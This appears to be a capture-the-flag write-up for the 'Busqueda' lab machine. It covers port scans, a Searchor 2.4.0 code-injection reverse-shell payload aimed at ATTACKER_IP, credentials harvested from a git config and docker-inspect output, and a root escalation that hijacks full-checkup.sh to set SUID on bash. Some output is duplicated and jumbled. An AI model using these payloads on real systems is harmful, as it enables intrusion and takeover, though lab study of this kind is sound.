Ip address:10.10.11.208


rustscan:


PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel



Nikto:
ikto -h 10.10.11.208
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.208
+ Target Hostname:    10.10.11.208
+ Target Port:        80
+ Start Time:         2023-04-21 12:35:11 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://searcher.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ 8081 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-04-21 12:43:15 (GMT3) (484 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



gobuster
$ gobuster dir -u searcher.htb -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://searcher.htb
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/21 12:43:02 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
/search               (Status: 405) [Size: 153]
Progress: 4564 / 4615 (98.89%)
===============================================================
2023/04/21 12:43:14 Finished
===============================================================



Website on port 80 is running : Powered by Flask and Searchor 2.4.0

we can find an exploit for Searchor 2.4.0:https://github.com/jonnyzar/POC-Searchor-2.4.2

From the POC,we need to use this part:

', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#


First we start a nc listener, and then we input the search query with our IP add and port

$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 49900
/bin/sh: 0: can't access tty; job control turned off
$ 


user flag: 

svc@busqueda:~$ cat user.txt
cat user.txt
18add0d6b7e1c2d54ac9642ce5943a83


Navigating to /var/www/app/.git folder we can read a config file

svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ 


this seems to be a new vhost on gitea, with a new user: cody and a passwd:jh1usoih2bkjaspwe92

we can try to see if we can use this password for svc user:

	merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ sudo -l
sudo -l
[sudo] password for svc:jh1usoih2bkjaspwe92  

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
we cannot read the script:

c@busqueda:/opt/scripts$ ls -lah
ls -lah
total 28K
drwxr-xr-x 3 root root 4.0K Dec 24 18:23 .
drwxr-xr-x 4 root root 4.0K Mar  1 10:46 ..
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
drwxr-x--- 8 root root 4.0K Apr  3 15:04 .git
-rwx--x--x 1 root root 3.3K Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1.9K Dec 24 21:23 system-checkup.py


but we can try to run it:

Sorry, user svc is not allowed to execute '/usr/bin/python3 system-checkup.py' as root on busqueda.
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd
</python3 /opt/scripts/system-checkup.py /etc/passwd
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup


svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps  
<in/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 39 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 39 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db



let's run all the commands:

vc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 
<thon3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
<python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] vc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 
<thon3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
<python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1665     │ 39h    │ 0    │ online    │ 0%       │ 29.5mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1665     │ 39h    │ 0    │ online    │ 0%       │ 29.5mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!


we find another domain: gitea.searcher.htb. let's add it to /etc/hosts


$ crackmapexec ssh 10.10.11.208 -u svc -p 'jh1usoih2bkjaspwe92'
SSH         10.10.11.208    22     10.10.11.208     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.10.11.208    22     10.10.11.208     [+] svc:jh1usoih2bkjaspwe92 


svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 42 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 42 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' $960873171e2e
Error: No such object: 60873171e2e

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}


svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}


from here we can get a password:yuiu1hoiu4i5ho1uh

as we previously logged to gitea as cody, with the password from svc user, we observed that there was another user, called administrator. Let's check to see if we can use this passwd with the administrator user.

It works!


now we are able to see some scripts created by administrator user and we are able to see the full-checkup.py functionality

Privesc:

svc@busqueda:/tmp$ echo '#!/bin/bash' > full-checkup.sh
svc@busqueda:/tmp$ echo 'chmod +s /bin/bash' >> full-checkup.sh 
svc@busqueda:/tmp$ chmod 777 full-checkup.sh 
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
ed6d312a80de518b30d26ffa75fa437f
bash-5.1# 
